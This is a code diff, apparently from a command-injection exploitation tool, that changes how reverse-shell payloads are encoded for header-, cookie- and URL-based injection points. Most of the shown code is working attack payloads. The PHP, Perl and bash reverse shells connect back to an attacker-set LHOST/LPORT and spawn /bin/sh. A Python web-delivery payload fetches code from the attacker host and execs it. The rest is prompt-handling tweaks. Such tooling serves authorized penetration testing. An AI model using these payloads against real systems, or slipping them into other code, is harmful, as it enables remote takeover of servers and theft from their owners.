@@ -148,6 +148,21 @@ def netcat_version(separator):
   return cmd
 
 """
+Use %XX only where the target performs one URL-decode pass; use literals for header-based injection points.
+"""
+def _needs_literal_encoding():
+  return (
+    settings.COOKIE_INJECTION
+    or settings.USER_AGENT_INJECTION
+    or settings.REFERER_INJECTION
+    or settings.HOST_INJECTION
+    or settings.CUSTOM_HEADER_INJECTION
+  )
+
+def _lit(encoded, literal):
+  return literal if _needs_literal_encoding() else encoded
+
+"""
 Set up other [1] reverse tcp shell connections
 [1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 """
@@ -230,7 +245,7 @@ def other_reverse_shells(separator):
         + "\","
         + settings.LPORT
         + ");"
-        "$proc=proc_open(\"/bin/sh -i\",array(0%3d>$sock,1%3d>$sock,2%3d>$sock),$pipes);'"
+        "$proc=proc_open(\"/bin/sh -i\",array(0" + _lit("%3d", "=") + ">$sock,1" + _lit("%3d", "=") + ">$sock,2" + _lit("%3d", "=") + ">$sock),$pipes);'"
       )
       break
 
@@ -246,9 +261,9 @@ def other_reverse_shells(separator):
         + ";"
         "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
         "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
-        "open(STDIN,\">%26S\");"
-        "open(STDOUT,\">%26S\");"
-        "open(STDERR,\">%26S\");"
+        "open(STDIN,\">" + _lit("%26", "&") + "S\");"
+        "open(STDOUT,\">" + _lit("%26", "&") + "S\");"
+        "open(STDERR,\">" + _lit("%26", "&") + "S\");"
         "exec(\"/bin/sh -i\");};'"
       )
       break
@@ -317,7 +332,7 @@ def other_reverse_shells(separator):
         + settings.LHOST
         + "/"
         + settings.LPORT
-        + " 1>%260 2>%260\" > /tmp/"
+        + " 1>" + _lit("%26", "&") + "0 2>" + _lit("%26", "&") + "0\" > /tmp/"
         + tmp_file
         + settings.SINGLE_WHITESPACE
         + separator
@@ -652,6 +667,8 @@ def other_reverse_shells(separator):
 
           if web_delivery == '1':
             data = "import sys%3bimport ssl%3bu%3d__import__('urllib'%2b{2%3a'',3%3a'.request'}[sys.version_info[0]],fromlist%3d('urlopen',))%3br%3du.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "',context%3dssl._create_unverified_context())%3bexec(r.read())%3b"
+            if _needs_literal_encoding():
+              data = data.replace("%3b", ";").replace("%3d", "=").replace("%2b", "+").replace("%3a", ":")
             if settings.TARGET_OS == settings.OS.WINDOWS:
               if not settings.USER_DEFINED_PYTHON_DIR:
                 checks.set_python_working_dir()
@@ -781,9 +798,8 @@ Set up the reverse TCP connection
 def configure_reverse_tcp(separator):
   # Set up LHOST for the reverse TCP connection.
   while True:
-    settings.print_data_to_stdout(settings.END_LINE.CR + settings.REVERSE_TCP_SHELL)
-
-    option = _input()
+    # Pass the prompt to input() so readline handles redraws and line state correctly.
+    option = common.safe_input(settings.REVERSE_TCP_SHELL)
 
     if option.lower() == "reverse_tcp":
       warn_msg = "You are in the '" + option.lower() + "' mode."
@@ -855,11 +871,13 @@ def configure_reverse_tcp(separator):
       # Invalid set option.
       else:
         common.invalid_option(option)
+        settings.print_data_to_stdout("Use 'set lhost <ip>' and 'set lport <port>' to configure the reverse TCP connection.")
         pass
 
     # Invalid option.
     else:
       common.invalid_option(option)
+      settings.print_data_to_stdout("Use 'set lhost <ip>' and 'set lport <port>' to configure the reverse TCP connection.")
       pass
 
 # eof
